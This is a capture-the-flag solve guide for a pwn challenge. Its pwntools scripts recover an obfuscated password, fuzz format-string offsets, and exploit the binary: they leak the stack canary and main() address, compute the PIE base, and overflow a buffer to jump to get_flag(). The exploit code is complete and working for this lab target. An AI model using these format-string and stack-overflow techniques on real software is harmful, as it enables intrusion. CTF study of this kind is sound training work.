# [Hard] Pwn - P2P Operator Terminal - Solve Guide

## Scripts
### De-obfuscate the Password
```
def obfuscate_char(c):
   return ((ord(c) << 12) * 11) // 3

def reverse_obfuscation(value):
    for i in range(32, 127):  # Printable ASCII range
        if obfuscate_char(chr(i)) == value:
            return chr(i)
    return '?'  # Unknown character

obf_password = [
    1006250, 1561941, 735914, 1486848, 1606997,
    765952, 1652053, 1111381, 1667072, 1486848,
    1126400, 765952, 1336661
]

recovered = ''.join(reverse_obfuscation(val) for val in obf_password)
print("Recovered password:", recovered)
```

### Format String Vulnerability Leak Fuzzer
```
from pwn import *

context.log_level = "CRITICAL"

context.binary = binary = ELF("./pwn", checksec=False)

for i in range(1, 200):
    p = binary.process()
    pl = f"%{i}$p"
    p.sendlineafter(b"[~] Operator Password: ", b"Ch1ck3nJocK3Y")
    p.sendlineafter(b"[~] Title of Your Report: ", pl.encode())

    p.recvuntil(b"-\n")

    leak = p.recvlineS().strip()

    print(f"[{i}]\t{leak}")
    
    p.close()
```

### Solve Script
```
from pwn import *

# Set context.binary to local binary
context.binary = binary = ELF("./binary", checksec=False)
# Set log_level to CRITICAL to not show all the pwntools output
context.log_level = 'CRITICAL'

# Offset to fill content buffer (128-bytes)
offset = 128
# Padding after the canary value to the return address (8-bytes)
padding_after_canary = 8

# Format string payload to leak the canary and main() function address values
# Canary is always at position 31. main() func address is at 35 locally and 37 remote
value_leak = b"%31$p.%35$p"

# Run the binary/connect to remote instance
p = binary.process()
##p = remote("0.cloud.chals.io", 10991)

# Submit valid password
p.sendlineafter(b"[~] Operator Password:", b"Ch1ck3nJocK3Y")

# Leak the canary and main() func address
p.sendlineafter(b"[~] Title of Your Report: ", value_leak)
# Receive data until the end of the line above the "formatted report header"
p.recvuntil(b"-\n")
leaked_canary, leaked_main_addr = p.recvlineS().strip().split(".")

print(f"[*] Leaked Canary:\t\t{leaked_canary}")
print(f"[*] Leaked main() Address:\t{leaked_main_addr}")

# Pack the leaked canary into valid 64-bit value
canary = p64(int(leaked_canary, 16))

# Convert leaked main() func address into hexadecimal value
main = int(leaked_main_addr, 16)

# Get main() function offset using objdump (or another tool, idc)
# objdump -D ./binary | grep "main"
main_offset = 0x0000000000001678

# Get get_flag() function offset using objdump (or another tool, idc)
# objdump -D ./binary | grep "get_flag"
get_flag_offset = 0x00000000000012d0

# Calculate PIE base
base_addr = main - main_offset
# Calculate PIE address of get_flag
#   Adding 0x5 to the calculated address because the calculated address does not work (sometimes).
#   It lands on an endbr64 instruction and just hangs. So instead, land a few instructions ahead in the function
#   and it works perfectly.
get_flag_addr = (base_addr + get_flag_offset) + 0x5

# Pack get_flag_addr into valid 64-bit value
get_flag = p64(get_flag_addr)

# Construct the final payload
payload = b"A" * offset			# Fill 128-byte buffer
payload += b"B" * 8			# Extra 8-byte padding after filling 128-byte buffer
payload += canary			# Overwrite canary with leaked canary value (itself)
payload += b"C" * padding_after_canary	# Padding after canary up to ret addre
payload += get_flag			# Overwrite ret addr with get_flag() addr

# Send the final payload to call the get_flag() function
p.sendlineafter(b"[~] Incident Description: ", payload)
# Receive the flag
print(p.recvallS())
```